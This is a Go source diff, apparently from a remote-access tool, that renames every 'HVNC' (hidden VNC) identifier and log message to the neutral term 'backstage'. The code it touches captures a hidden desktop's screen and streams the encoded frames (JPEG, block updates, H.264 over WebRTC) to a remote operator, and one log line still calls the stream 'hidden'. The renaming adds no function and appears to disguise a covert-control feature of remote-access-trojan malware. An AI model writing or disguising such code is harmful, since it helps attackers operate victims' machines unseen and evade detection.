@@ -504,9 +504,9 @@ var (
 	prevMu    sync.Mutex
 	prevFrame *prevImage
 
-	hvncPrevMu       sync.Mutex
-	hvncPrevFrame    *prevImage
-	hvncLastKeyframe atomic.Int64
+	backstagePrevMu       sync.Mutex
+	backstagePrevFrame    *prevImage
+	backstageLastKeyframe atomic.Int64
 )
 
 type prevImage struct {
@@ -616,12 +616,12 @@ func ResetPrev() {
 	resetH264Encoder()
 }
 
-func ResetPrevHVNC() {
-	hvncPrevMu.Lock()
-	hvncPrevFrame = nil
-	hvncPrevMu.Unlock()
-	hvncLastKeyframe.Store(0)
-	resetH264EncoderHVNC()
+func ResetPrevbackstage() {
+	backstagePrevMu.Lock()
+	backstagePrevFrame = nil
+	backstagePrevMu.Unlock()
+	backstageLastKeyframe.Store(0)
+	resetH264Encoderbackstage()
 }
 
 func RequestDesktopFullFrame() {
@@ -642,12 +642,12 @@ func useDesktopSoftwareH264() bool {
 	return desktopSoftwareH264.Load()
 }
 
-func RequestHVNCFullFrame() {
-	hvncPrevMu.Lock()
-	hvncPrevFrame = nil
-	hvncPrevMu.Unlock()
-	hvncLastKeyframe.Store(0)
-	resetH264EncoderHVNC()
+func RequestbackstageFullFrame() {
+	backstagePrevMu.Lock()
+	backstagePrevFrame = nil
+	backstagePrevMu.Unlock()
+	backstageLastKeyframe.Store(0)
+	resetH264Encoderbackstage()
 }
 
 func jpegQuality() int {
@@ -731,8 +731,8 @@ const (
 	cursorROIMargin = 32
 	windowROIMargin = 12
 
-	hvncSamplingRate = 1
-	hvncChangeThresh = 1
+	backstageSamplingRate = 1
+	backstageChangeThresh = 1
 )
 
 func buildFrame(img *image.RGBA, display int, quality int) (wire.Frame, time.Duration, error) {
@@ -841,7 +841,7 @@ func buildFrame(img *image.RGBA, display int, quality int) (wire.Frame, time.Dur
 	return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: format}, Data: blockPayload}, encDur, nil
 }
 
-func buildFrameHVNC(img *image.RGBA, display int, quality int) (wire.Frame, time.Duration, error) {
+func buildFramebackstage(img *image.RGBA, display int, quality int) (wire.Frame, time.Duration, error) {
 	encStart := time.Now()
 	width := img.Bounds().Dx()
 	height := img.Bounds().Dy()
@@ -850,49 +850,49 @@ func buildFrameHVNC(img *image.RGBA, display int, quality int) (wire.Frame, time
 	now := time.Now()
 	if codec == "h264" {
 		if width%2 != 0 || height%2 != 0 {
-			log.Printf("hvnc capture: h264 skipped for odd dimensions (%dx%d), falling back to jpeg", width, height)
+			log.Printf("backstage capture: h264 skipped for odd dimensions (%dx%d), falling back to jpeg", width, height)
 			codec = "jpeg"
 		} else {
 			if webrtcpub.ConsumeKeyframeRequest() {
-				resetH264EncoderHVNC()
+				resetH264Encoderbackstage()
 			}
-			h264Bytes, err := encodeH264FrameHVNC(img)
+			h264Bytes, err := encodeH264Framebackstage(img)
 			if err == nil && len(h264Bytes) > 0 {
-				hvncLastKeyframe.Store(now.UnixNano())
+				backstageLastKeyframe.Store(now.UnixNano())
 				statFullFrames.Add(1)
-				frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "h264", HVNC: true}, Data: h264Bytes}
+				frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "h264", Backstage: true}, Data: h264Bytes}
 				return frame, time.Since(encStart), nil
 			}
 			h264WarnOnce.Do(func() {
 				detail := h264AvailabilityDetail()
 				if detail != "" {
-					log.Printf("hvnc capture: h264 encode unavailable, falling back to jpeg: %v (%s)", err, detail)
+					log.Printf("backstage capture: h264 encode unavailable, falling back to jpeg: %v (%s)", err, detail)
 					return
 				}
-				log.Printf("hvnc capture: h264 encode unavailable, falling back to jpeg: %v", err)
+				log.Printf("backstage capture: h264 encode unavailable, falling back to jpeg: %v", err)
 			})
 			codec = "jpeg"
 		}
 	}
 
-	hvncPrevMu.Lock()
-	pf := hvncPrevFrame
-	hvncPrevMu.Unlock()
+	backstagePrevMu.Lock()
+	pf := backstagePrevFrame
+	backstagePrevMu.Unlock()
 
-	if pf == nil || pf.w != width || pf.h != height || now.Sub(time.Unix(0, hvncLastKeyframe.Load())) > keyframeEvery {
+	if pf == nil || pf.w != width || pf.h != height || now.Sub(time.Unix(0, backstageLastKeyframe.Load())) > keyframeEvery {
 		jpegBytes, err := encodeJPEG(img, quality)
-		hvncPrevMu.Lock()
-		copyPrevHVNC(img)
-		hvncPrevMu.Unlock()
-		hvncLastKeyframe.Store(now.UnixNano())
+		backstagePrevMu.Lock()
+		copyPrevbackstage(img)
+		backstagePrevMu.Unlock()
+		backstageLastKeyframe.Store(now.UnixNano())
 		statFullFrames.Add(1)
-		frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg", HVNC: true}, Data: jpegBytes}
+		frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg", Backstage: true}, Data: jpegBytes}
 		return frame, time.Since(encStart), err
 	}
 
-	// use strict block detection for HVNC otherwise half the time it just doesn't fucking update pictures
+	// use strict block detection for backstage otherwise half the time it just doesn't fucking update pictures
 	// because of how slow the capture shit is.
-	blocks, blockPayload, encDur, err := encodeBlocksHVNC(img, pf, quality, codec, display)
+	blocks, blockPayload, encDur, err := encodeBlocksbackstage(img, pf, quality, codec, display)
 	if err != nil {
 		return wire.Frame{}, encDur, err
 	}
@@ -901,7 +901,7 @@ func buildFrameHVNC(img *image.RGBA, display int, quality int) (wire.Frame, time
 		// Keepalive frames indicate no block-level changes, so avoid copying the
 		// full RGBA buffer into prevFrame again.
 		statKeepaliveFrames.Add(1)
-		frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "blocks", HVNC: true}, Data: blockPayload}
+		frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "blocks", Backstage: true}, Data: blockPayload}
 		return frame, encDur, nil
 	}
 
@@ -910,13 +910,13 @@ func buildFrameHVNC(img *image.RGBA, display int, quality int) (wire.Frame, time
 
 	if changedRatio > maxBlockRatio {
 		jpegBytes, err := encodeJPEG(img, quality)
-		hvncPrevMu.Lock()
-		copyPrevHVNC(img)
-		hvncPrevMu.Unlock()
-		hvncLastKeyframe.Store(now.UnixNano())
+		backstagePrevMu.Lock()
+		copyPrevbackstage(img)
+		backstagePrevMu.Unlock()
+		backstageLastKeyframe.Store(now.UnixNano())
 		statBlockFallbacks.Add(1)
 		statFullFrames.Add(1)
-		frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg", HVNC: true}, Data: jpegBytes}
+		frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg", Backstage: true}, Data: jpegBytes}
 		return frame, time.Since(encStart), err
 	}
 
@@ -926,7 +926,7 @@ func buildFrameHVNC(img *image.RGBA, display int, quality int) (wire.Frame, time
 	if codec == "raw" {
 		format = "blocks_raw"
 	}
-	frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: format, HVNC: true}, Data: blockPayload}
+	frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: format, Backstage: true}, Data: blockPayload}
 	return frame, encDur, nil
 }
 
@@ -1001,7 +1001,7 @@ func encodeBlocks(img *image.RGBA, prev *prevImage, quality int, codec string, d
 
 			changed := blockChanged(img.Pix, prev.pix, stride, prevStride, x, y, ww, hh)
 			if !changed && blockIntersectsROI(x, y, ww, hh, rois) {
-				changed = blockChangedHVNC(img.Pix, prev.pix, stride, prevStride, x, y, ww, hh)
+				changed = blockChangedbackstage(img.Pix, prev.pix, stride, prevStride, x, y, ww, hh)
 			}
 			if changed {
 				changedGrid[by*blocksWide+bx] = true
@@ -1276,12 +1276,12 @@ func sortRegionsByROI(regions []streamRegion, hints []roiHint) {
 	})
 }
 
-func blockChangedHVNC(cur, prev []byte, curStride, prevStride int, x, y, w, h int) bool {
+func blockChangedbackstage(cur, prev []byte, curStride, prevStride int, x, y, w, h int) bool {
 	changedPixels := 0
 	sampledPixels := 0
 
-	for row := 0; row < h; row += hvncSamplingRate {
-		for col := 0; col < w; col += hvncSamplingRate {
+	for row := 0; row < h; row += backstageSamplingRate {
+		for col := 0; col < w; col += backstageSamplingRate {
 			sampledPixels++
 			ci := (y+row)*curStride + (x+col)*4
 			pi := (y+row)*prevStride + (x+col)*4
@@ -1304,7 +1304,7 @@ func blockChangedHVNC(cur, prev []byte, curStride, prevStride int, x, y, w, h in
 				db = -db
 			}
 
-			if dr > hvncChangeThresh || dg > hvncChangeThresh || db > hvncChangeThresh {
+			if dr > backstageChangeThresh || dg > backstageChangeThresh || db > backstageChangeThresh {
 				changedPixels++
 
 				if sampledPixels > 20 && changedPixels*100 > sampledPixels {
@@ -1320,7 +1320,7 @@ func blockChangedHVNC(cur, prev []byte, curStride, prevStride int, x, y, w, h in
 	return changedPixels*100 > sampledPixels
 }
 
-func encodeBlocksHVNC(img *image.RGBA, prev *prevImage, quality int, codec string, display int) (int, []byte, time.Duration, error) {
+func encodeBlocksbackstage(img *image.RGBA, prev *prevImage, quality int, codec string, display int) (int, []byte, time.Duration, error) {
 	width := img.Bounds().Dx()
 	height := img.Bounds().Dy()
 	stride := img.Stride
@@ -1360,7 +1360,7 @@ func encodeBlocksHVNC(img *image.RGBA, prev *prevImage, quality int, codec strin
 				hh = height - y
 			}
 
-			if blockChangedHVNC(img.Pix, prev.pix, stride, prevStride, x, y, ww, hh) {
+			if blockChangedbackstage(img.Pix, prev.pix, stride, prevStride, x, y, ww, hh) {
 				changedGrid[by*blocksWide+bx] = true
 				changedCount++
 			}
@@ -1513,19 +1513,19 @@ func copyPrev(img *image.RGBA) {
 	}
 }
 
-func copyPrevHVNC(img *image.RGBA) {
+func copyPrevbackstage(img *image.RGBA) {
 	width := img.Bounds().Dx()
 	height := img.Bounds().Dy()
 	n := len(img.Pix)
-	if hvncPrevFrame != nil && cap(hvncPrevFrame.pix) >= n {
-		hvncPrevFrame.w = width
-		hvncPrevFrame.h = height
-		hvncPrevFrame.pix = hvncPrevFrame.pix[:n]
-		copy(hvncPrevFrame.pix, img.Pix)
+	if backstagePrevFrame != nil && cap(backstagePrevFrame.pix) >= n {
+		backstagePrevFrame.w = width
+		backstagePrevFrame.h = height
+		backstagePrevFrame.pix = backstagePrevFrame.pix[:n]
+		copy(backstagePrevFrame.pix, img.Pix)
 	} else {
 		buf := make([]byte, n)
 		copy(buf, img.Pix)
-		hvncPrevFrame = &prevImage{w: width, h: height, pix: buf}
+		backstagePrevFrame = &prevImage{w: width, h: height, pix: buf}
 	}
 }
 
@@ -1587,25 +1587,25 @@ func SetQualityAndCodec(quality int, codec string) {
 		h264WarnOnce = sync.Once{}
 		if s != "h264" {
 			resetH264Encoder()
-			resetH264EncoderHVNC()
+			resetH264Encoderbackstage()
 		}
 	case "":
 
 	default:
 		overrideCodec.Store("jpeg")
 		resetH264Encoder()
-		resetH264EncoderHVNC()
+		resetH264Encoderbackstage()
 	}
 }
 
-func NowHVNC(ctx context.Context, env *rt.Env) error {
+func Nowbackstage(ctx context.Context, env *rt.Env) error {
 	if env.Cfg.DisableCapture {
-		return sendBlackFrameHVNC(ctx, env)
+		return sendBlackFramebackstage(ctx, env)
 	}
 	if !supportsBackstageCapture() {
 		return nil
 	}
-	return captureAndSendHVNC(ctx, env)
+	return captureAndSendbackstage(ctx, env)
 }
 
 func NowVirtual(ctx context.Context, env *rt.Env) error {
@@ -1659,7 +1659,7 @@ func captureAndSendVirtual(ctx context.Context, env *rt.Env) error {
 	}
 	captureDur := time.Since(t0)
 
-	willSendViaWebRTC := blockCodec() == "h264" && webrtcpub.IsActive(webrtcpub.KindHVNC)
+	willSendViaWebRTC := blockCodec() == "h264" && webrtcpub.IsActive(webrtcpub.Kindbackstage)
 	var slotAcquired bool
 	if !willSendViaWebRTC && !AcquireFrameSlot() {
 		PutRGBA(img)
@@ -1668,7 +1668,7 @@ func captureAndSendVirtual(ctx context.Context, env *rt.Env) error {
 	slotAcquired = !willSendViaWebRTC
 
 	quality := jpegQuality()
-	frame, encodeDur, err := buildFrameHVNC(img, 0, quality)
+	frame, encodeDur, err := buildFramebackstage(img, 0, quality)
 	PutRGBA(img)
 	img = nil
 	if err != nil {
@@ -1691,12 +1691,12 @@ func captureAndSendVirtual(ctx context.Context, env *rt.Env) error {
 		}
 		return nil
 	}
-	if frame.Header.Format == "h264" && webrtcpub.IsActive(webrtcpub.KindHVNC) {
+	if frame.Header.Format == "h264" && webrtcpub.IsActive(webrtcpub.Kindbackstage) {
 		dur := time.Second / time.Duration(fps)
 		if dur <= 0 {
 			dur = 33 * time.Millisecond
 		}
-		if werr := webrtcpub.WriteH264(webrtcpub.KindHVNC, frame.Data, dur); werr != nil {
+		if werr := webrtcpub.WriteH264(webrtcpub.Kindbackstage, frame.Data, dur); werr != nil {
 			log.Printf("webrtc: write hidden h264 failed: %v", werr)
 		}
 		if slotAcquired {
@@ -1737,12 +1737,12 @@ func virtualSendCompletedFrame(ctx context.Context, env *rt.Env, frame wire.Fram
 	if ctx.Err() != nil {
 		return nil
 	}
-	if frame.Header.Format == "h264" && webrtcpub.IsActive(webrtcpub.KindHVNC) {
+	if frame.Header.Format == "h264" && webrtcpub.IsActive(webrtcpub.Kindbackstage) {
 		dur := time.Second / time.Duration(fps)
 		if dur <= 0 {
 			dur = 33 * time.Millisecond
 		}
-		if werr := webrtcpub.WriteH264(webrtcpub.KindHVNC, frame.Data, dur); werr != nil {
+		if werr := webrtcpub.WriteH264(webrtcpub.Kindbackstage, frame.Data, dur); werr != nil {
 			log.Printf("webrtc: write hidden h264 failed: %v", werr)
 		}
 		return nil
@@ -1769,7 +1769,7 @@ func sendBlackFrameVirtual(ctx context.Context, env *rt.Env) error {
 
 	img := image.NewRGBA(image.Rect(0, 0, 64, 64))
 	quality := 60
-	frame, _, err := buildFrameHVNC(img, 0, quality)
+	frame, _, err := buildFramebackstage(img, 0, quality)
 	if err != nil {
 		return err
 	}
@@ -1778,36 +1778,36 @@ func sendBlackFrameVirtual(ctx context.Context, env *rt.Env) error {
 }
 
 func supportsBackstageCapture() bool {
-	count := HVNCMonitorCount()
+	count := BackstageMonitorCount()
 	return count > 0
 }
 
-func captureAndSendHVNC(ctx context.Context, env *rt.Env) error {
+func captureAndSendbackstage(ctx context.Context, env *rt.Env) error {
 	defer func() {
 		if r := recover(); r != nil {
-			log.Printf("hvnc capture: panic in captureAndSendHVNC: %v", r)
+			log.Printf("backstage capture: panic in captureAndSendbackstage: %v", r)
 		}
 	}()
 
-	display := env.HVNCSelectedDisplay
-	if display < 0 || display >= HVNCMonitorCount() {
+	display := env.BackstageSelectedDisplay
+	if display < 0 || display >= BackstageMonitorCount() {
 		display = 0
-		log.Printf("hvnc capture: requested display %d out of range, defaulting to 0", display)
+		log.Printf("backstage capture: requested display %d out of range, defaulting to 0", display)
 	}
 
 	t0 := time.Now()
 	img, err := safeBackstageCaptureDisplay(display)
 	if err != nil {
-		log.Printf("hvnc capture: capture failed: %v (sending black frame)", err)
-		return sendBlackFrameHVNC(ctx, env)
+		log.Printf("backstage capture: capture failed: %v (sending black frame)", err)
+		return sendBlackFramebackstage(ctx, env)
 	}
 	if img == nil {
-		log.Printf("hvnc capture: capture returned nil image (sending black frame)")
-		return sendBlackFrameHVNC(ctx, env)
+		log.Printf("backstage capture: capture returned nil image (sending black frame)")
+		return sendBlackFramebackstage(ctx, env)
 	}
 	captureDur := time.Since(t0)
 
-	willSendViaWebRTC := blockCodec() == "h264" && webrtcpub.IsActive(webrtcpub.KindHVNC)
+	willSendViaWebRTC := blockCodec() == "h264" && webrtcpub.IsActive(webrtcpub.Kindbackstage)
 	var slotAcquired bool
 	if !willSendViaWebRTC && !AcquireFrameSlot() {
 		PutRGBA(img)
@@ -1816,7 +1816,7 @@ func captureAndSendHVNC(ctx context.Context, env *rt.Env) error {
 	slotAcquired = !willSendViaWebRTC
 
 	quality := jpegQuality()
-	frame, encodeDur, err := buildFrameHVNC(img, display, quality)
+	frame, encodeDur, err := buildFramebackstage(img, display, quality)
 	PutRGBA(img)
 	img = nil
 	if err != nil {
@@ -1839,13 +1839,13 @@ func captureAndSendHVNC(ctx context.Context, env *rt.Env) error {
 		}
 		return nil
 	}
-	if frame.Header.Format == "h264" && webrtcpub.IsActive(webrtcpub.KindHVNC) {
+	if frame.Header.Format == "h264" && webrtcpub.IsActive(webrtcpub.Kindbackstage) {
 		dur := time.Second / time.Duration(fps)
 		if dur <= 0 {
 			dur = 33 * time.Millisecond
 		}
-		if werr := webrtcpub.WriteH264(webrtcpub.KindHVNC, frame.Data, dur); werr != nil {
-			log.Printf("webrtc: write hvnc h264 failed: %v", werr)
+		if werr := webrtcpub.WriteH264(webrtcpub.Kindbackstage, frame.Data, dur); werr != nil {
+			log.Printf("webrtc: write backstage h264 failed: %v", werr)
 		}
 		if slotAcquired {
 			ReleaseFrameSlot()
@@ -1868,7 +1868,7 @@ func captureAndSendHVNC(ctx context.Context, env *rt.Env) error {
 
 	if shouldLogFrame(now) {
 		total := time.Since(t0)
-		log.Printf("hvnc capture: stream display=%d fps≈%d format=%s size=%d cap=%s enc=%s send=%s total=%s",
+		log.Printf("backstage capture: stream display=%d fps≈%d format=%s size=%d cap=%s enc=%s send=%s total=%s",
 			display, fps, frame.Header.Format, len(frame.Data), captureDur, encodeDur, sendDur, total)
 	}
 
@@ -1886,14 +1886,14 @@ func safeBackstageCaptureDisplay(display int) (*image.RGBA, error) {
 	return img, nil
 }
 
-func sendBlackFrameHVNC(ctx context.Context, env *rt.Env) error {
+func sendBlackFramebackstage(ctx context.Context, env *rt.Env) error {
 	if ctx.Err() != nil {
 		return nil
 	}
 
 	img := image.NewRGBA(image.Rect(0, 0, 64, 64))
 	quality := 60
-	frame, _, err := buildFrameHVNC(img, 0, quality)
+	frame, _, err := buildFramebackstage(img, 0, quality)
 	if err != nil {
 		return err
 	}
